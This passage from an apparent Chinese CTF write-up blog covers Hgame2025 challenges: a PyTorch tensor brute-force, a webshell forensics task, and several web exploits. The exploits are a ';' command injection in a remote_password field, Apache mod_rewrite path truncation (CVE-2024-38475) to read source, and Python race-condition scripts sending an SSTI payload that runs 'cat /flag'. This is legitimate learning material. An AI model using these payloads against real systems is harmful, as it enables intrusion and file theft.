class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><br>target_mean = <span class="hljs-number">0.31415000000000004</span><br><br>weight = torch.tensor([<br>    [-<span class="hljs-number">0.1905</span>, -<span class="hljs-number">0.2279</span>, -<span class="hljs-number">0.1038</span>, <span class="hljs-number">0.2425</span>, <span class="hljs-number">0.1687</span>, -<span class="hljs-number">0.0876</span>, -<span class="hljs-number">0.0443</span>, <span class="hljs-number">0.1849</span>,<br>               <span class="hljs-number">0.1420</span>,  <span class="hljs-number">0.2552</span>],<br>             [ <span class="hljs-number">0.1606</span>, -<span class="hljs-number">0.2255</span>,  <span class="hljs-number">0.2935</span>, -<span class="hljs-number">0.1483</span>,  <span class="hljs-number">0.0447</span>, -<span class="hljs-number">0.0528</span>,  <span class="hljs-number">0.3090</span>, -<span class="hljs-number">0.0193</span>,<br>              -<span class="hljs-number">0.0874</span>, -<span class="hljs-number">0.1935</span>],<br>             [-<span class="hljs-number">0.2987</span>, -<span class="hljs-number">0.3123</span>,  <span class="hljs-number">0.1831</span>,  <span class="hljs-number">0.2289</span>, -<span class="hljs-number">0.1729</span>,  <span class="hljs-number">0.0225</span>, -<span class="hljs-number">0.1234</span>,  <span class="hljs-number">0.1704</span>,<br>               <span class="hljs-number">0.2700</span>,  <span class="hljs-number">0.1911</span>],<br>             [ <span class="hljs-number">0.1425</span>,  <span class="hljs-number">0.0841</span>, -<span class="hljs-number">0.2787</span>, -<span class="hljs-number">0.0964</span>, -<span class="hljs-number">0.2263</span>, -<span class="hljs-number">0.2821</span>,  <span class="hljs-number">0.0173</span>,  <span class="hljs-number">0.0279</span>,<br>               <span class="hljs-number">0.2843</span>,  <span class="hljs-number">0.1745</span>],<br>             [ <span class="hljs-number">0.1492</span>, -<span class="hljs-number">0.1212</span>, -<span class="hljs-number">0.3122</span>, -<span class="hljs-number">0.0605</span>,  <span class="hljs-number">0.2146</span>, -<span class="hljs-number">0.2049</span>, -<span class="hljs-number">0.2629</span>,  <span class="hljs-number">0.2081</span>,<br>               <span class="hljs-number">0.2239</span>,  <span class="hljs-number">0.0339</span>],<br>             [ <span class="hljs-number">0.3045</span>, -<span class="hljs-number">0.3089</span>, -<span class="hljs-number">0.0101</span>,  <span class="hljs-number">0.0076</span>,  <span class="hljs-number">0.1810</span>,  <span class="hljs-number">0.2333</span>, -<span class="hljs-number">0.0124</span>,  <span class="hljs-number">0.0553</span>,<br>               <span class="hljs-number">0.1279</span>, -<span class="hljs-number">0.2548</span>],<br>             [-<span class="hljs-number">0.2894</span>,  <span class="hljs-number">0.0390</span>, -<span class="hljs-number">0.2061</span>,  <span class="hljs-number">0.1143</span>,  <span class="hljs-number">0.2291</span>, -<span class="hljs-number">0.1281</span>,  <span class="hljs-number">0.1897</span>,  <span class="hljs-number">0.0182</span>,<br>               <span class="hljs-number">0.0472</span>, -<span class="hljs-number">0.2510</span>],<br>             [ <span class="hljs-number">0.0527</span>, -<span class="hljs-number">0.0044</span>,  <span class="hljs-number">0.2950</span>,  <span class="hljs-number">0.1157</span>,  <span class="hljs-number">0.0345</span>,  <span class="hljs-number">0.0579</span>,  <span class="hljs-number">0.2961</span>, -<span class="hljs-number">0.0682</span>,<br>               <span class="hljs-number">0.0336</span>, -<span class="hljs-number">0.0558</span>],<br>             [-<span class="hljs-number">0.2985</span>,  <span class="hljs-number">0.1062</span>, -<span class="hljs-number">0.2369</span>,  <span class="hljs-number">0.0633</span>, -<span class="hljs-number">0.1295</span>,  <span class="hljs-number">0.2976</span>,  <span class="hljs-number">0.0094</span>, -<span class="hljs-number">0.3112</span>,<br>              -<span class="hljs-number">0.2357</span>, -<span class="hljs-number">0.1416</span>],<br>             [ <span class="hljs-number">0.1578</span>,  <span class="hljs-number">0.2312</span>,  <span class="hljs-number">0.2572</span>,  <span class="hljs-number">0.2929</span>,  <span class="hljs-number">0.0181</span>, -<span class="hljs-number">0.2295</span>, -<span class="hljs-number">0.2644</span>,  <span class="hljs-number">0.0538</span>,<br>              -<span class="hljs-number">0.2774</span>, -<span class="hljs-number">0.2838</span>]<br>], dtype=torch.float32)<br><br>bias = torch.tensor([<span class="hljs-number">0.1209</span>,  <span class="hljs-number">0.0082</span>, -<span class="hljs-number">0.2783</span>, -<span class="hljs-number">0.3144</span>, -<span class="hljs-number">0.1505</span>,  <span class="hljs-number">0.2989</span>,  <span class="hljs-number">0.0367</span>,  <span class="hljs-number">0.2310</span>,<br>          <span class="hljs-number">0.0135</span>,  <span class="hljs-number">0.2238</span>], dtype=torch.float32)<br><br>out_features, in_features = weight.shape<br><br>mW = torch.mean(weight)<br><br>mB = torch.mean(bias)<br><br>c = (target_mean - mB) / (in_features * mW)<br><br>x = torch.full((<span class="hljs-number">1</span>, in_features), c, dtype=torch.float32)<br><br>x1 = torch.nn.functional.linear(x, weight, bias)<br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Computed constant input x:&quot;</span>)<br><span class="hljs-built_in">print</span>(x)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Weight mean:&quot;</span>, mW.item(), <span class="hljs-string">&quot;  Bias mean:&quot;</span>, mB.item())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Computed constant c:&quot;</span>, c.item())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Linear layer output x1:&quot;</span>)<br><span class="hljs-built_in">print</span>(x1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Mean of x1:&quot;</span>, torch.mean(x1).item())<br><br><span class="hljs-built_in">print</span>(torch.allclose(torch.mean(x1), torch.tensor(target_mean), rtol=<span class="hljs-number">1e-05</span>, atol=<span class="hljs-number">0.0001</span>))<br></code></pre></td></tr></table></figure><p>然而这里得出来的张量理论上应该是对的但输入后还是错的，未出现预期 flag。又改数据试了一会，感觉可能是题目所谓的时间错位加密，中间还有一道程序导致了 entity 中结果的偏移，所以最后决定以理论正确的输入为基础，0.01 的步长，正负 0.60 遍历一遍（每次变化对应 security 部分的平均值变化量为 0.0001）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> math<br><br>entity = torch.jit.load(<span class="hljs-string">&#x27;entity.pt&#x27;</span>, map_location=torch.device(<span class="hljs-string">&#x27;cpu&#x27;</span>))<br>entity.<span class="hljs-built_in">eval</span>()<br><br>weight1 = [[-<span class="hljs-number">0.1905</span>, -<span class="hljs-number">0.2279</span>, -<span class="hljs-number">0.1038</span>,  <span class="hljs-number">0.2425</span>,  <span class="hljs-number">0.1687</span>, -<span class="hljs-number">0.0876</span>, -<span class="hljs-number">0.0443</span>,  <span class="hljs-number">0.1849</span>,<br>          <span class="hljs-number">0.1420</span>,  <span class="hljs-number">0.2552</span>],<br>        [ <span class="hljs-number">0.1606</span>, -<span class="hljs-number">0.2255</span>,  <span class="hljs-number">0.2935</span>, -<span class="hljs-number">0.1483</span>,  <span class="hljs-number">0.0447</span>, -<span class="hljs-number">0.0528</span>,  <span class="hljs-number">0.3090</span>, -<span class="hljs-number">0.0193</span>,<br>         -<span class="hljs-number">0.0874</span>, -<span class="hljs-number">0.1935</span>],<br>        [-<span class="hljs-number">0.2987</span>, -<span class="hljs-number">0.3123</span>,  <span class="hljs-number">0.1831</span>,  <span class="hljs-number">0.2289</span>, -<span class="hljs-number">0.1729</span>,  <span class="hljs-number">0.0225</span>, -<span class="hljs-number">0.1234</span>,  <span class="hljs-number">0.1704</span>,<br>          <span class="hljs-number">0.2700</span>,  <span class="hljs-number">0.1911</span>],<br>        [ <span class="hljs-number">0.1425</span>,  <span class="hljs-number">0.0841</span>, -<span class="hljs-number">0.2787</span>, -<span class="hljs-number">0.0964</span>, -<span class="hljs-number">0.2263</span>, -<span class="hljs-number">0.2821</span>,  <span class="hljs-number">0.0173</span>,  <span class="hljs-number">0.0279</span>,<br>          <span class="hljs-number">0.2843</span>,  <span class="hljs-number">0.1745</span>],<br>        [ <span class="hljs-number">0.1492</span>, -<span class="hljs-number">0.1212</span>, -<span class="hljs-number">0.3122</span>, -<span class="hljs-number">0.0605</span>,  <span class="hljs-number">0.2146</span>, -<span class="hljs-number">0.2049</span>, -<span class="hljs-number">0.2629</span>,  <span class="hljs-number">0.2081</span>,<br>          <span class="hljs-number">0.2239</span>,  <span class="hljs-number">0.0339</span>],<br>        [ <span class="hljs-number">0.3045</span>, -<span class="hljs-number">0.3089</span>, -<span class="hljs-number">0.0101</span>,  <span class="hljs-number">0.0076</span>,  <span class="hljs-number">0.1810</span>,  <span class="hljs-number">0.2333</span>, -<span class="hljs-number">0.0124</span>,  <span class="hljs-number">0.0553</span>,<br>          <span class="hljs-number">0.1279</span>, -<span class="hljs-number">0.2548</span>],<br>        [-<span class="hljs-number">0.2894</span>,  <span class="hljs-number">0.0390</span>, -<span class="hljs-number">0.2061</span>,  <span class="hljs-number">0.1143</span>,  <span class="hljs-number">0.2291</span>, -<span class="hljs-number">0.1281</span>,  <span class="hljs-number">0.1897</span>,  <span class="hljs-number">0.0182</span>,<br>          <span class="hljs-number">0.0472</span>, -<span class="hljs-number">0.2510</span>],<br>        [ <span class="hljs-number">0.0527</span>, -<span class="hljs-number">0.0044</span>,  <span class="hljs-number">0.2950</span>,  <span class="hljs-number">0.1157</span>,  <span class="hljs-number">0.0345</span>,  <span class="hljs-number">0.0579</span>,  <span class="hljs-number">0.2961</span>, -<span class="hljs-number">0.0682</span>,<br>          <span class="hljs-number">0.0336</span>, -<span class="hljs-number">0.0558</span>],<br>        [-<span class="hljs-number">0.2985</span>,  <span class="hljs-number">0.1062</span>, -<span class="hljs-number">0.2369</span>,  <span class="hljs-number">0.0633</span>, -<span class="hljs-number">0.1295</span>,  <span class="hljs-number">0.2976</span>,  <span class="hljs-number">0.0094</span>, -<span class="hljs-number">0.3112</span>,<br>         -<span class="hljs-number">0.2357</span>, -<span class="hljs-number">0.1416</span>],<br>        [ <span class="hljs-number">0.1578</span>,  <span class="hljs-number">0.2312</span>,  <span class="hljs-number">0.2572</span>,  <span class="hljs-number">0.2929</span>,  <span class="hljs-number">0.0181</span>, -<span class="hljs-number">0.2295</span>, -<span class="hljs-number">0.2644</span>,  <span class="hljs-number">0.0538</span>,<br>         -<span class="hljs-number">0.2774</span>, -<span class="hljs-number">0.2838</span>]]<br>bias1 = [<span class="hljs-number">0.1209</span>,  <span class="hljs-number">0.0082</span>, -<span class="hljs-number">0.2783</span>, -<span class="hljs-number">0.3144</span>, -<span class="hljs-number">0.1505</span>,  <span class="hljs-number">0.2989</span>,  <span class="hljs-number">0.0367</span>,  <span class="hljs-number">0.2310</span>,<br>         <span class="hljs-number">0.0135</span>,  <span class="hljs-number">0.2238</span>]<br>torch_weight1 = torch.tensor(weight1, dtype=torch.float32)<br>torch_bias1   = torch.tensor(bias1, dtype=torch.float32)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(-<span class="hljs-number">60</span>,<span class="hljs-number">60</span>):<br>    temp = <span class="hljs-number">378.3501922607422</span><br>    input_tensor = torch.tensor([[temp+i*<span class="hljs-number">0.01</span>, <span class="hljs-number">136.4001922607422</span>, <span class="hljs-number">136.4001922607422</span>, <span class="hljs-number">136.4001922607422</span>,<br>                                      <span class="hljs-number">136.4001922607422</span>, <span class="hljs-number">136.4001922607422</span>, <span class="hljs-number">136.4001922607422</span>, <span class="hljs-number">136.4001922607422</span>,<br>                                      <span class="hljs-number">136.4001922607422</span>, <span class="hljs-number">136.4001922607422</span>]], dtype=torch.float32)<br><br>    x0 = torch.nn.functional.linear(input_tensor,torch_weight1,torch_bias1)<br>    <span class="hljs-built_in">print</span>(torch.mean(torch_weight1))<br>    <span class="hljs-built_in">print</span>(torch.mean(torch_bias1))<br>    <span class="hljs-built_in">print</span>(torch.mean(x0))<br>    <span class="hljs-built_in">print</span>(x0)<br>    f = torch.allclose(torch.mean(x0), torch.tensor(<span class="hljs-number">0.31415000000000004</span>), rtol=<span class="hljs-number">1.0000000000000001e-05</span>, atol=<span class="hljs-number">0.0001</span>)<br>    <span class="hljs-built_in">print</span>(f)<br>    output = entity(input_tensor)<br>    <span class="hljs-built_in">print</span>(output)<br></code></pre></td></tr></table></figure><p>最后终于跑出了结果，0.3141 -&gt; 0.3163 偏移了 0.0022</p><p><img src="/img/Hgame2025WP/CeSSbmVXHoGFgSxDTKycNAmDn4c.png"></p><h3 id="Computer-cleaner"><a href="#Computer-cleaner" class="headerlink" title="Computer cleaner"></a>Computer cleaner</h3><p>开虚拟机遇到一点问题，我的是 17.0，出题人应该是 17.5 及以上吧，浅改一下配置文件。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">找到攻击者的webshell连接密码<br>对攻击者进行简单溯源<br>排查攻击者目的<br></code></pre></td></tr></table></figure><p>按题目所给三步来即可得到 flag</p><p><img src="/img/Hgame2025WP/Ie7zbpP1Bo2l74xOOiEckwfznBf.png"></p><p><img src="/img/Hgame2025WP/AKJPbE7N6oJAlyxl640c3STQnNH.png"></p><p><img src="/img/Hgame2025WP/D85YbuUlTotiSmxr4vbc0YgqnZc.png"></p><p><img src="/img/Hgame2025WP/IhUrbfLVQoiedVxtZtAci61Mnpd.png"></p><h1 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h1><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h2><h3 id="Level-21096-HoneyPot"><a href="#Level-21096-HoneyPot" class="headerlink" title="Level 21096 HoneyPot"></a>Level 21096 HoneyPot</h3><p>目录扫描，存在 <code>/flag</code>，直接访问为 <code>fake_flag</code></p><p>审计附件源码 <code>main.go</code>，主要实现了数据库连接测试、导入、查询这几个功能，发现存在函数 <code>sanitizeInput()</code> 和 <code>validateImportConfig()</code> 对各种输入严格过滤。</p><p>在注释的附近发现各个参数先拼接为字符串 command，再用 <code>cmd := exec.Command(&quot;sh&quot;, &quot;-c&quot;, command)</code> 执行命令，其中参数 <code>config.RemotePassword</code> 遗漏了对输入的过滤，从而可以实施命令注入。</p><p>点击导入数据，截包，在 <code>remote_password</code> 字段处加 <code>;</code> 来截断前面的命令，然后执行 <code>/writeflag</code></p><p><img src="/img/Hgame2025WP/RXldbCkq0o0DBDxX4sOcmusSnbf.png"></p><p>再访问 <code>/flag</code>，得到 flag</p><p><img src="/img/Hgame2025WP/H4bcbHBq2o9jYWxf5QhcovWmnIb.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
      <tag>WriteUp</tag>
      
      <tag>misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hgame2025 部分赛题复现</title>
    <link href="/2025/03/02/Hgame2025%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/03/02/Hgame2025%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Hgame2025-部分赛题复现"><a href="#Hgame2025-部分赛题复现" class="headerlink" title="Hgame2025 部分赛题复现"></a>Hgame2025 部分赛题复现</h1><h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Level-24-Pacman"><a href="#Level-24-Pacman" class="headerlink" title="Level 24 Pacman"></a>Level 24 Pacman</h3><p>这道题做出来了，但是有更简单的方法</p><p>游戏失败一次后即可得到一个“gift”，经过 base64+ 栅栏密码解密得到一个假的 flag</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/BofvbORQ6oUhCQxTMj9cPzopnTb.png"></p><p>flag 是在游戏通关后给出，那么就完全可能在 js 源码里找到 flag 相关的字符串。这里可以结合关键字“gift”进行搜索，发现了另一个不同的“gift”，同样的方式解密即可得到 flag</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/BNAgbjD1To2lnSxWGoecxrJinbh.png"></p><h3 id="Level-38475-角落"><a href="#Level-38475-角落" class="headerlink" title="Level 38475 角落"></a>Level 38475 角落</h3><p>用 dirsearch 目录扫描可以发现 robots.txt，其中有敏感信息 app.conf</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/MvOVbVXGJoePSpxLGPfcK7PBnsb.png"></p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/VMBpb2SYgooQXoxMcPYcBhWgnFc.png"></p><p>从中可以拿到 app.py 的绝对路径，再利用 rewrite 来读⽂件，做题时未能联想到这一点，也不了解 CVE-2024-38475，只是用 <code>L1nk/</code> 开头的 <code>user-agent</code> 扫描爆破，所以未能找到任何有效信息。</p><p>研读一下参考资料：<a href="https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/">https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/</a> 可知，Apache 的 mod_rewrite 允许网站管理员透过 RewriteRule 语法轻松的将路径透过指定的规则改写：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">RewriteRule</span> Pattern Substitution<span class="hljs-meta"> [flags]</span><br></code></pre></td></tr></table></figure><p>其中目标可以是一个档案系统路径或是一个网址，在改写路径时，mod_rewrite 会强制把结果视为网址处理(splitout_queryargs())，这导致了在 HTTP 请求中可以透过一个问号 <code>%3F</code> 去截断 RewriteRule 后面的路径或网址，从而引出了路径截断和误导 RewriteFlag 的设置两种攻击方式，本题涉及的应该是前者。</p><p>所以访问 <code>/admin/usr/local/apache2/app/app.py%3f</code> 可以截断后面的内容读取到 app.py 的源码</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/JOdwb24EQoAMlExvZLbcSI3dnEh.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, render_template_string, redirect<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> templates<br><br>app = Flask(__name__)<br>pwd = os.path.dirname(__file__)<br>show_msg = templates.show_msg<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">readmsg</span>():<br>        filename = pwd + <span class="hljs-string">&quot;/tmp/message.txt&quot;</span><br>        <span class="hljs-keyword">if</span> os.path.exists(filename):<br>                f = <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;r&#x27;</span>)<br>                message = f.read()<br>                f.close()<br>                <span class="hljs-keyword">return</span> message<br>        <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No message now.&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/index&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>        status = request.args.get(<span class="hljs-string">&#x27;status&#x27;</span>)<br>        <span class="hljs-keyword">if</span> status <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                status = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>, status=status)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/send&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_message</span>():<br>        filename = pwd + <span class="hljs-string">&quot;/tmp/message.txt&quot;</span><br>        message = request.form[<span class="hljs-string">&#x27;message&#x27;</span>]<br><br>        f = <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;w&#x27;</span>)<br>        f.write(message) <br>        f.close()<br><br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;index?status=Send successfully!!&#x27;</span>)<br>        <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_message</span>():<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&#123;&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> readmsg():<br>                show = show_msg.replace(<span class="hljs-string">&quot;&#123;&#123;message&#125;&#125;&quot;</span>, readmsg())<br>                <span class="hljs-keyword">return</span> render_template_string(show)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;waf!!&#x27;</span><br>        <br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>        app.run(host = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port = <span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>从源码中可以发现，留言板发送的信息会写入 <code>/tmp/message.txt</code> 中，存在 <code>/read</code> 路由也就是 <code>/app/read</code> 可以读取留言板发送的信息 <code>/tmp/message.txt</code> 并直接渲染在模版中返回，但前提是不能包含 <code>&#123;</code>，否则返回 <code>&#39;waf!!&#39;</code>。那么可以考虑通过 SSTI 实现 RCE，通过条件竞争来绕过 if 判断语句。</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/FL8cbf8bsouurhxDsZecOlxjnXb.png"></p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/P6WBbbBNdobRqsxSv5BcnszUndh.png"></p><p>先自己写个脚本试一下，对写入和读取过程进行条件竞争，在前一次读取文件无 <code>&#123;</code> 通过 if 判断后、后一次读取文件传入 show 渲染前，写入目标语句 <code>&#123;&#123;config.__class__.__init__.__globals__['os'].popen('cat /flag').read()&#125;&#125;</code>，实现 RCE</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_</span>():<br>    data=&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()&#125;&#125;&quot;</span>&#125;<br>    res=requests.post(<span class="hljs-string">&quot;http://node1.hgame.vidar.club:30668/app/send&quot;</span>,data=data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_</span>():<br>    res=requests.get(<span class="hljs-string">&quot;http://node1.hgame.vidar.club:30668/app/read&quot;</span>)<br>    <span class="hljs-built_in">print</span>(res.text)<br>threads=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>):<br>    thread1=threading.Thread(target=send_)<br>    thread2=threading.Thread(target=read_)<br>    <span class="hljs-comment">#这里当时遇到了一个问题，我写的是target=send_()那么实际为立即执行，两个函数为顺序执行，无法实现条件竞争</span><br>    <span class="hljs-comment">#正确的应该是target=send_，多线程完成请求</span><br>    threads.append(thread1)<br>    threads.append(thread2)<br>    thread1.start()<br>    thread2.start()<br><span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>    t.join()<br></code></pre></td></tr></table></figure><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/ACwSbqbhdoseXcxAGdTc8fsOnyh.png"></p><p>官方 WP 所给脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests <br><span class="hljs-keyword">import</span> threading <br>url = <span class="hljs-string">&#x27;http://node1.hgame.vidar.club:32737/&#x27;</span> <br>data = &#123; <br>    <span class="hljs-string">&quot;messgae&quot;</span>: <span class="hljs-string">&quot;&quot;</span>, <br>    &#125; <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_msg</span>(<span class="hljs-params">i</span>): <br>    data[<span class="hljs-string">&quot;message&quot;</span>] = <span class="hljs-string">&quot;&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()&#125;&#125;&quot;</span>+<span class="hljs-built_in">str</span>(i) <br>    r = requests.post(url + <span class="hljs-string">&#x27;/app/send&#x27;</span>, data=data) <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_msg</span>(<span class="hljs-params">i</span>): <br>    r = requests.get(url + <span class="hljs-string">&#x27;/app/read&#x27;</span>) <br>    <span class="hljs-built_in">print</span>(i, <span class="hljs-string">&quot;read&quot;</span>, r.text) <br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Latest&quot;</span> <span class="hljs-keyword">in</span> r.text: <br>        <span class="hljs-built_in">print</span>(r.text) <br>        exit() <br>threads = [] <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>): <br>    thread = threading.Thread(target=write_msg, args=(i,)) <br>    threads.append(thread) <br>    thread.start() <br>    thread = threading.Thread(target=read_msg, args=(i,)) <br>    threads.append(thread) <br>    thread.start() <br><span class="hljs-keyword">for</span> thread <span class="hljs-keyword">in</span> threads: <br>    thread.join()<br></code></pre></td></tr></table></figure><h3 id="Level-25-双面人派对"><a href="#Level-25-双面人派对" class="headerlink" title="Level 25 双面人派对"></a>Level 25 双面人派对</h3><p>比赛的时候不熟悉 IDA 且未及时购买第二个提示，且末尾心态有些急，成功脱壳后没找到配置的内容，导致即便知道了后续的解题思路也无从下手 <a href="https://baimeow.cn/posts/ctf/d3go/">https://baimeow.cn/posts/ctf/d3go/</a>。重新检索了一下 IDA 相关用法，通过查找所有字符串找到了这段配置</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/FMFHbGvd5oHP6QxfeMRcFt6Sn1g.png"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 